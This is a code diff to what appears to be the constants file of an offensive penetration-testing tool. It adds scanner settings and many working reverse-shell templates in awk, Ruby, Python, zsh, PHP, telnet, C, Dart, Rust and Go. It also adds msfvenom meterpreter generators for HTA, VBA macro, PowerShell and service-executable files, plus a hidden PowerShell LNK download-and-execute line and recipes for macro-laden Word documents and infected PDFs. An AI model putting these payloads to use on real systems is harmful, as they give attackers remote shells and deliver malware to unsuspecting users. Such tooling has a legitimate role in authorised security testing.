@@ -32,6 +32,8 @@ WEB_EXTENSIONS = "php,html,txt,bak,old,asp,aspx,jsp,cgi,xml,json,conf,log,zip"
 NMAP_DEFAULT_TIMING = "T4"
 NMAP_TOP_PORTS = 1000
 NMAP_UDP_TOP_PORTS = 100
+RUSTSCAN_DEFAULT_PORTS = 65535
+MASSCAN_DEFAULT_RATE = 1000
 
 # ── Payload Templates ────────────────────────────────────────────────────────
 REVERSE_SHELL_TEMPLATES = {
@@ -111,6 +113,51 @@ REVERSE_SHELL_TEMPLATES = {
         "client.connect({lport}, '{lhost}', function(){{"
         "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
         "return /a/;}})();"
+    ),
+    "awk": (
+        "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'"
+    ),
+    "ruby-sh": (
+        "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{lhost}\",{lport}))'"
+    ),
+    "python3-short": (
+        "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
+    ),
+    "python-short": (
+        "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
+    ),
+    "zsh": (
+        "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+    ),
+    "php-exec": (
+        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    ),
+    "php-system": (
+        "php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    ),
+    "php-passthru": (
+        "php -r '$sock=fsockopen(\"{lhost}\",{lport});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    ),
+    "php-shell_exec": (
+        "php -r '$sock=fsockopen(\"{lhost}\",{lport});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    ),
+    "php-popen": (
+        "php -r '$sock=fsockopen(\"{lhost}\",{lport});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
+    ),
+    "telnet": (
+        "TF=$(mktemp -u);mkfifo $TF && telnet {lhost} {lport} 0<$TF | /bin/sh 1>$TF"
+    ),
+    "c": (
+        "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){{\n    int port = {lport};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{lhost}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {{\"sh\", NULL}};\n    execve(\"/bin/sh\", argv, NULL);\n\n    return 0;\n}}"
+    ),
+    "dart": (
+        "import 'dart:io';import 'dart:convert';main() {{Socket.connect(\"{lhost}\", {lport}).then((socket) {{Process.start('sh', []).then((Process process) {{socket.listen((List<int> s) {{process.stdin.add(s);}});process.stdout.listen((List<int> s) {{socket.add(s);}});process.stderr.listen((List<int> s) {{socket.add(s);}});}});}});}}"
+    ),
+    "rust": (
+        "use std::net::TcpStream;use std::os::unix::io::{{AsRawFd, FromRawFd}};use std::process::{{Command, Stdio}};fn main() {{let s = TcpStream::connect(\"{lhost}:{lport}\").unwrap();let fd = s.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe {{ Stdio::from_raw_fd(fd) }}).stdout(unsafe {{ Stdio::from_raw_fd(fd) }}).stderr(unsafe {{ Stdio::from_raw_fd(fd) }}).spawn().unwrap().wait().unwrap();}}"
+    ),
+    "golang": (
+        "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
     ),
 }
 
@@ -193,6 +240,73 @@ MSFVENOM_PRESETS = {
         "format": "aspx",
         "extension": "aspx",
     },
+}
+
+# ── Payload Categories ───────────────────────────────────────────────────────
+PAYLOAD_CATEGORIES = {
+    "Windows": ["powershell", "powershell-base64", "java", "ruby", "nc", "socat", "c", "rust", "golang", "nc-mkfifo", "awk"],
+    "Linux": ["bash", "bash-encoded", "sh", "python", "python3", "python-short", "python3-short", "nc", "nc-mkfifo", "nc-c", "socat", "zsh", "telnet", "awk", "c", "rust", "golang", "ruby", "ruby-sh", "java", "perl", "lua", "dart", "php-exec", "php-shell_exec"],
+    "Web": ["php", "php-exec", "php-system", "php-passthru", "php-shell_exec", "php-popen"]
+}
+
+# ── File Payloads ────────────────────────────────────────────────────────────
+FILE_PAYLOADS = {
+    "hta-psh": {
+        "description": "HTML Application (HTA) with PowerShell",
+        "ext": "hta",
+        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f hta-psh -o {outfile}",
+        "group": "Windows",
+        "type": "command"
+    },
+    "vba-macro": {
+        "description": "MS Office VBA Macro",
+        "ext": "vba",
+        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f vba -o {outfile}",
+        "group": "Windows",
+        "type": "command"
+    },
+    "psh-script": {
+        "description": "PowerShell Script (.ps1)",
+        "ext": "ps1",
+        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f psh-cmd -o {outfile}",
+        "group": "Windows",
+        "type": "command"
+    },
+    "exe-service": {
+        "description": "Windows Service Executable",
+        "ext": "exe",
+        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe-service -o {outfile}",
+        "group": "Windows",
+        "type": "command"
+    },
+    "lnk-shortcut": {
+        "description": "Malicious LNK Target String",
+        "ext": "txt",
+        "content_template": "Create a windows shortcut (.lnk) with the following target:\n\npowershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\"",
+        "group": "Windows",
+        "type": "text"
+    },
+    "doc-macro": {
+        "description": "Word Document embedded macro instructions",
+        "ext": "txt",
+        "content_template": "Create a 'vba-macro' payload first.\nOpen Word -> View -> Macros -> Create.\nPaste the VBA code into the document macro editor, save as .docm.",
+        "group": "Windows",
+        "type": "text"
+    },
+    "pdf-adobe": {
+        "description": "Adobe PDF Embedded EXE instructions",
+        "ext": "txt",
+        "content_template": "To generate an infected PDF, use msfconsole:\nuse exploit/windows/fileformat/adobe_pdf_embedded_exe\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nset FILENAME shell.pdf\nexploit",
+        "group": "Windows",
+        "type": "text"
+    },
+    "bash-script": {
+        "description": "Linux Bash Script via msfvenom",
+        "ext": "sh",
+        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f sh -o {outfile}",
+        "group": "Linux",
+        "type": "command"
+    }
 }
 
 # ── LFI Payloads ─────────────────────────────────────────────────────────────
